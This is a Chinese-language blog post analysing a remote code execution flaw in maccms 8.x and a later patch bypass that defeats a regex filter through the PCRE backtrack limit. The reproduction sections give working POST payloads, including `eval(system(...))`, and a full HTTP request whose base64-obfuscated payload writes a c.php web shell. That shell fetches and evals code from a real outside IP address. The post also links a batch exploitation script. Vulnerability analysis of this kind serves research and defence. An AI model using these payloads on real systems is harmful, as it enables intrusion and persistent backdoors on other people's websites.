# maccms 8.x 漏洞

## 0x01 前言

太久太久没写文章。。。最近还发布了一些法律，许多网站都关了，我还在考虑是否去开这个博客，因为分享技术还得承担法律责任，不过不会再公布具有攻击性的工具或者exp。

这个maccms的RCE是最近被绕过了，写一篇分析文。环境搭建的也不多写了，之前写的一篇Maccms的sql注入[http://getshe11.com/2018/08/26/Maccms-sql-injection-analysis/](https://link.zhihu.com/?target=http%3A//getshe11.com/2018/08/26/Maccms-sql-injection-analysis/)有讲到，本文用到的源码可以去[https://github.com/yaofeifly/Maccms8.x](https://link.zhihu.com/?target=https%3A//github.com/yaofeifly/Maccms8.x)这里下载，绕过的源码可以去[https://github.com/magicblack/maccms8](https://link.zhihu.com/?target=https%3A//github.com/magicblack/maccms8)下载

## 0x02 漏洞复现

1. [https://github.com/yaofeifly/Maccms8.x](https://link.zhihu.com/?target=https%3A//github.com/yaofeifly/Maccms8.x)下载搭建好之后
2. 用hackbar

```
url：http://127.0.0.1/maccms888/?m=vod-search

post：wd={if-A:phpinfo()}{endif-A}

{if-A:@eval(system('ls /');)}{endif-A}
{if-A:echo "My name is "}{endif-A}
```



3. 可以看到phpinfo执行了



![img](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203011718360.jpeg)



## 0x03 漏洞分析

phpstorm 调试走起，我忽略掉一些步骤，比如怎么用phpstorm 调式[http://getshe11.com/2018/04/10/Breakpoint%20debugging%20with%20phpstorm+xdebug/](https://link.zhihu.com/?target=http%3A//getshe11.com/2018/04/10/Breakpoint%20debugging%20with%20phpstorm%2Bxdebug/) 这里有写到。

这里不下断点直接从开头断下，具体设置在[http://getshe11.com/2018/12/22/ThinkPHP5-remote-code-execution-vulnerability-dynamic-analysis/](https://link.zhihu.com/?target=http%3A//getshe11.com/2018/12/22/ThinkPHP5-remote-code-execution-vulnerability-dynamic-analysis/) 有提到。



![img](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203011718600.jpeg)



当执行到`require(MAC_ROOT.'/inc/common/360_safe3.php');`我们走进去看下，可以看到匹配规则并没有匹配到我们输入的字符,然后继续往下走了。



![img](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203011718208.jpeg)



到模板内容替换这一块就不跟大家继续走了，大家有时间可以自己走一遍程序的替换流程，我们直接往下走



![img](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203011718195.jpeg)



到这里，我们F7跟进去



![img](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203011718099.jpeg)



F8往下走到`eval`这里可以看到，除了在接受get、post数据那一块有过滤sql语句的检测，到这里没有任何过滤就直接执行了。



![img](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203011718627.jpeg)



## 0x04 80w个a绕过匹配漏洞

这个漏洞很有趣，我居然没想到用的是一个P神之前发的一篇文章的[PHP利用PCRE回溯次数限制绕过某些安全限制](https://link.zhihu.com/?target=https%3A//www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)

这个是Maccms8最新的一个版本里面存在，这个也是修复上面的rce的漏洞的版本。

payload：

```http
POST /index.php?m=vod-search HTTP/1.1
Host: xxxx
Cache-Control: max-age=0
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 800580

wd=union%28这里有80w个a%E4%B8%AAa%29%7Bif-A%3Aprint%28fputs%28fopen%28base64_decode%28Yy5waHA%29%2Cw%29%2Cbase64_decode%28PD9waHAgZnVuY3Rpb24gcygpeyRjb250ZW50cyA9IGZpbGVfZ2V0X2NvbnRlbnRzKCdodHRwOi8vNjcuMTk4LjE4Ni40MjoyOTgwOC9zL2FkbWluZTIxLnR4dCcpO2EoJGNvbnRlbnRzKTt9ZnVuY3Rpb24gYSgkY29ubil7JGIgPSAnICc7ZXZhbCgkYi4kY29ubi4kYik7fXMoKTsgPz4x%29%29%29%7D%7Bendif-A%7D"}&submit=%E6%90%9C+%E7%B4%A2
```

执行后会在本目录下生成一个c.php



![img](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203011718933.jpeg)



这里可以用burp上面的功能来实现这80w个a



![img](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203011718531.jpeg)



也可以去用我写的一个批量脚本：[https://github.com/F0r3at/Python-Tools/blob/master/maccms8_rce.py](https://link.zhihu.com/?target=https%3A//github.com/F0r3at/Python-Tools/blob/master/maccms8_rce.py)

不过现在官网github上面修复了，在这里限制了字符的长度。



![img](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203011718545.jpeg)



## 0x05 结束

最近因为工作，调整不过来，以后会恢复持续输出的！